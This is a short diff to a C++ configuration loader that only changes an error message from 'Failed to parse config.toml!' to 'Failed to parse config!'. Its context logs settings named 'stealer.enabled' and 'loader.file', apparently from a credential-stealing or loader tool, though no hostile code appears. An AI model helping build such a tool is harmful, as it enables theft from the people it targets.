@@ -57,7 +57,7 @@ void glt::config::LoadConfig() {
 		logger->debug("stealer.enabled = {}, loader.file = {}", cfg.stealer_enabled, cfg.loader_file);
 	}
 	catch (const std::exception& ex) {
-		logger->error("Failed to parse config.toml!");
+		logger->error("Failed to parse config!");
 		logger->error(ex.what());
 	}
 }
